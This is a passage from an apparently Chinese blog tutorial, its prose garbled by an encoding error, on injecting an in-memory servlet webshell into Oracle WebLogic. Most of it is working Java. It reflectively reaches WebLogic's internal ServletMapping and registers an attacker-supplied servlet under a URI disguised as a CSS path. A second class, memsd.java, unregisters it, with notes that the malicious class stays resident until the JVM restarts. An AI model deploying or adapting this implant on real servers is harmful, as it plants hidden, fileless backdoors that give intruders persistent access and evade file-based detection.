</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span><span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>InvocationTargetException e<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>                memsHttpServlet<span style=color:#f92672>=</span>Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;pers.neo.memsHttpServletb&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>            HttpServlet httpServlet<span style=color:#f92672>=(</span>HttpServlet<span style=color:#f92672>)</span>memsHttpServlet<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span> gcw <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)</span> <span style=color:#f92672>((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            field <span style=color:#f92672>=</span> gcw<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;connectionHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            field<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            httpConn <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HttpConnectionHandler<span style=color:#f92672>)</span> field<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>gcw<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// è·å–servletContext
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            WebAppServletContext servletContext <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// è·å–servletMapping
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            Method getServletMapping <span style=color:#f92672>=</span> servletContext<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getServletMapping&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            ServletMapping mappings <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ServletMapping<span style=color:#f92672>)</span> getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>servletContext<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// ä½¿ç”¨ServletStubåŒ…è£…HttpServlet
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            Constructor<span style=color:#f92672>&lt;?&gt;</span> ServletStubImplConstructor <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;weblogic.servlet.internal.ServletStubImpl&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>getDeclaredConstructor</span><span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Servlet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> WebAppServletContext<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            ServletStubImplConstructor<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            ServletStubImpl servletStub <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ServletStubImpl<span style=color:#f92672>)</span> ServletStubImplConstructor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>,</span> httpServlet<span style=color:#f92672>,</span> servletContext<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// ä½¿ç”¨URLMathchHelperåŒ…è£…ServletStub
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            Constructor<span style=color:#f92672>&lt;?&gt;</span> URLMatchHelperConstructor <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;weblogic.servlet.internal.URLMatchHelper&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>getDeclaredConstructor</span><span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> ServletStubImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            URLMatchHelperConstructor<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            Object umh <span style=color:#f92672>=</span> URLMatchHelperConstructor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>,</span> servletStub<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            ServletResponseImpl resp <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getResponse</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            ServletOutputStreamImpl sos <span style=color:#f92672>=</span> resp<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletOutputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>valueOf</span><span style=color:#f92672>(</span>mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>size</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// æ·»åŠ åˆ°ServletMappingä¸­ï¼Œå³ä»£è¡¨æ³¨å…¥servletå†…å­˜é©¬æˆåŠŸ
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>)</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>                mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>,</span> umh<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;==\n&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>valueOf</span><span style=color:#f92672>(</span>mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>size</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>flush</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            e<span style=color:#f92672>.</span><span style=color:#a6e22e>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=å‚è€ƒé˜…è¯»>å‚è€ƒé˜…è¯»<a hidden class=anchor aria-hidden=true href=#å‚è€ƒé˜…è¯»>#</a></h3><ul><li><a href=https://www.cnblogs.com/bitterz/p/14970230.html>Weblogicä¸‹çš„servletå†…å­˜é©¬æ³¨å…¥-æ— å‚ç…§çº¯è°ƒè¯•</a></li><li><a href=https://myzxcg.com/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/#%E8%8E%B7%E5%8F%96webappservletcontext>Weblogic-å†…å­˜é©¬åˆ†æä¸å®ç°</a></li><li><a href=https://www.xuxblog.top/archives/java-dong-tai-jia-zai-zi-jie-ma-de-fang-fa>JavaåŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•</a></li></ul><h2 id=memsdjavaå¸è½½å†…å­˜é©¬>memsd.javaï¼šå¸è½½å†…å­˜é©¬<a hidden class=anchor aria-hidden=true href=#memsdjavaå¸è½½å†…å­˜é©¬>#</a></h2><h3 id=æ³¨æ„ç‚¹-2>æ³¨æ„ç‚¹<a hidden class=anchor aria-hidden=true href=#æ³¨æ„ç‚¹-2>#</a></h3><ol><li>å› ä¸ºæˆ‘ä»¬åœ¨åŠ è½½è‡ªå®šä¹‰httpservletå­—èŠ‚ç çš„æ—¶å€™åšäº†try catchå¤„ç†ï¼Œæ‰€ä»¥å¯ä»¥ä»»æ„å¸è½½å†…å­˜é©¬å¹¶é‡æ–°åŠ è½½ã€‚å¦åˆ™çš„è¯å¸è½½åéœ€è¦ç»™httpservletæ¢ä¸€ä¸ªç±»åæ‰èƒ½åŠ è½½ã€‚</li><li>æ‰€è°“å¸è½½åªæ˜¯å°†è·¯ç”±å»æ‰ï¼Œå†…å­˜ä¸­è¿˜æ˜¯å­˜åœ¨æ¶æ„ç±»çš„ã€‚éœ€è¦é‡å¯JVMæ‰èƒ½å®Œå…¨æ¸…ç†ã€‚</li></ol><h3 id=æœ€ç»ˆæ•ˆæœ-7>æœ€ç»ˆæ•ˆæœ<a hidden class=anchor aria-hidden=true href=#æœ€ç»ˆæ•ˆæœ-7>#</a></h3><p><img loading=lazy src=image-20220704174306916.png alt=image-20220704174306916></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-45>45</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.internal.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.provider.ContainerSupportProviderImpl<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.utils.ServletMapping<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.work.ExecuteThread<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Method<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>memsd</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>memsd</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        String URI <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/pages/css/bluecameby1&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Field</span> field <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        HttpConnectionHandler httpConn <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span> gcw <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)</span> <span style=color:#f92672>((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            field <span style=color:#f92672>=</span> gcw<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;connectionHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            field<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            httpConn <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HttpConnectionHandler<span style=color:#f92672>)</span> field<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>gcw<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// è·å–servletContext
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            WebAppServletContext servletContext <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// è·å–servletMapping
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            Method getServletMapping <span style=color:#f92672>=</span> servletContext<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getServletMapping&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            ServletMapping mappings <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ServletMapping<span style=color:#f92672>)</span> getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>servletContext<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            ServletResponseImpl resp <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getResponse</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            ServletOutputStreamImpl sos <span style=color:#f92672>=</span> resp<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletOutputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>valueOf</span><span style=color:#f92672>(</span>mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>size</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>//delete pattern from mapping
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>)</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>                mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>removePattern</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;==\n&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>valueOf</span><span style=color:#f92672>(</span>mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>size</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>flush</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            e<span style=color:#f92672>.</span><span style=color:#a6e22e>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
